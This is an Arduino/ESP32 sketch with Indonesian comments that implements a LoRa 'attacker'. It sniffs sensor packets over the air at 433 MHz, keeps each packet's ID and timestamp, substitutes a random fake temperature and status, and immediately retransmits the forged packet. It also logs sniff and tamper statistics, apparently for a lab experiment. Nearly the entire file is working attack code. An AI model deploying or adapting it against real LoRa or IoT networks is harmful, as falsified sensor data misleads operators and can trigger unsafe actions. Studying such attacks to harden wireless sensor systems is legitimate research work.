/*
ATTACKER / SNIFFER + TAMPERING LoRa
--------------------------------
Author: Mohammad Rizki  Fadillah
Description:
Alat ini menyadap (Sniff) paket di udara, mengambil ID dan Timestamp aslinya,
kemudian memanipulasi (Tampering) nilai Suhu secara random dan mengubah Statusnya.
Setelah dimanipulasi, paket langsung ditembakkan kembali ke udara.
--------------------------------
*/

#include <SPI.h>
#include <LoRa.h>

#define SS   5
#define RST  14
#define DIO0 26

// ===== PARAM =====
const uint32_t EXPECTED = 200;
const unsigned long TIMEOUT_MS = 50000;     // Terminating 50 detik

// ===== METRICS =====
uint32_t sniffedCount = 0;
uint32_t decodedCount = 0;
uint32_t invalidCount = 0;
uint32_t tamperedCount = 0; // Ngitung total tembakan hasil manipulasi

// ===== OPTIONAL UNIQUE TRACK =====
bool seen[EXPECTED] = {false};
uint32_t uniqueCount = 0;
uint32_t duplicateCount = 0;

// ===== STATE LOGIC =====
unsigned long lastRecvTime = 0;
bool started = false;
bool done = false; 

// ===== VALIDATION =====
bool isValidPayload(String data, uint32_t &id) {
  int p1 = data.indexOf(',');
  int p2 = data.indexOf(',', p1 + 1);

  if (p1 == -1 || p2 == -1) return false;

  String idStr = data.substring(0, p1);

  // cek ID numeric
  for (int i = 0; i < idStr.length(); i++) {
    if (!isDigit(idStr[i])) return false;
  }

  id = idStr.toInt();
  return true;
}

void printSummary() {
  float sniffRate = (sniffedCount * 100.0) / EXPECTED;
  float decodeRate = (sniffedCount > 0) ? ((decodedCount * 100.0) / sniffedCount) : 0;
  float packetLoss = 100.0 - sniffRate;

  Serial.println("\n=== ATTACKER (TAMPERING) SUMMARY ===");

  Serial.print("Sniffed Total: "); Serial.println(sniffedCount);
  Serial.print("Decoded Valid: "); Serial.println(decodedCount);
  Serial.print("Invalid (Gagal dibaca): "); Serial.println(invalidCount);

  Serial.print("Unique: "); Serial.println(uniqueCount);
  Serial.print("Duplicate: "); Serial.println(duplicateCount);
  
  Serial.print("TOTAL TEMBAKAN TAMPERING: "); Serial.println(tamperedCount);

  Serial.print("Sniff Success / PDR (%): "); Serial.println(sniffRate);
  Serial.print("Missed / Packet Loss (%): "); Serial.println(packetLoss);
  Serial.print("Decode Success (%): "); Serial.println(decodeRate);
}

void setup() {
  Serial.begin(115200);

  // Bikin seed random biar angkanya beneran acak tiap kali jalan
  randomSeed(analogRead(0)); 

  SPI.begin(18, 19, 23, SS);
  LoRa.setPins(SS, RST, DIO0);

  if (!LoRa.begin(433000000)) {
    Serial.println("LoRa init FAILED!");
    while (1);
  }

  LoRa.setSpreadingFactor(7);
  LoRa.setSignalBandwidth(125E3);
  LoRa.setCodingRate4(5);

  LoRa.receive();

  Serial.println("Attacker (Sniff + TAMPERING) Ready...");
  Serial.println("Langsung manipulasi & tembak tiap dapet mangsa\n");
}

void loop() {
  if (done) return; 

  int packetSize = LoRa.parsePacket();

  if (packetSize) {
    lastRecvTime = millis();
    started = true;
    sniffedCount++;

    String data = "";
    while (LoRa.available()) {
      data += (char)LoRa.read();
    }

    uint32_t id = 0;
    bool valid = isValidPayload(data, id);

    if (valid) {
      decodedCount++;
      if (id < EXPECTED) {
        if (!seen[id]) {
          seen[id] = true;
          uniqueCount++;
        } else {
          duplicateCount++;
        }
      }
    } else {
      invalidCount++;
    }

    // =========================
    // LOG SNIFF (NGUPING)
    // =========================
    Serial.print("[SNIFF] Asli: ");
    Serial.print(data);
    Serial.print(" | RSSI=");
    Serial.print(LoRa.packetRssi());
    if (!valid) Serial.print(" | INVALID");
    Serial.println();

    // =========================
    // TAMPERING LOGIC (MANIPULASI DATA)
    // =========================
    if (valid) { 
      // 1. Ekstrak ID dan Timestamp dari payload asli
      int p1 = data.indexOf(',');
      int p2 = data.indexOf(',', p1 + 1);
      
      if (p1 != -1 && p2 != -1) {
        String idStr = data.substring(0, p1);
        String tsStr = data.substring(p1 + 1, p2);

        // 2. Bikin suhu palsu secara random (antara 10.00 sampai 50.00 derajat)
        float fakeTemp = random(1000, 5000) / 100.0;
        
        // 3. Ubah status sesuai suhu palsu
        String fakeStatus = (fakeTemp > 30.0) ? "PANAS" : "AMAN";

        // 4. Jahit ulang jadi payload baru yang siap tembak
        String tamperedData = idStr + "," + tsStr + "," + String(fakeTemp, 2) + "," + fakeStatus;

        // =========================
        // TEMBAK DATA PALSU
        // =========================
        tamperedCount++;
        Serial.print("  └─> [TAMPER] Tembak palsu: ");
        Serial.println(tamperedData);

        LoRa.beginPacket();
        LoRa.print(tamperedData);
        LoRa.endPacket();

        LoRa.receive(); // Wajib balik ke mode receive biar siap nguping paket berikutnya
      }
    }

    // =========================
    // CEK TARGET
    // =========================
    if (sniffedCount >= EXPECTED) {
      printSummary();
      done = true;
    }
  }

  // =========================
  // TIMEOUT / TERMINATING LOGIC (50 Detik)
  // =========================
  if (started && !done && (millis() - lastRecvTime > TIMEOUT_MS)) {
    Serial.println("\n[TIMEOUT] 50 Detik ga ada mangsa baru. Sesi Tampering STOP!");
    printSummary();
    done = true;
  }
}